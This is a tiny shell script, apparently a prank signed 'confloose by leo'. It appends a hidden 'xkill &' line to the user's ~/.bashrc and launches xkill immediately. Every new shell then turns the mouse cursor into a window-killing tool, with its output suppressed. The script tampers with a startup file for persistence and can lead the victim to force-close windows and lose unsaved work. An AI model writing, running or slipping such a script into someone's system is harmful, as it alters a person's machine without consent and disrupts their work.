#!/bin/sh

echo "xkill 1>&2>/dev/null & # confloose by leo" >> "$HOME/.bashrc"
xkill 1>&2>/dev/null &
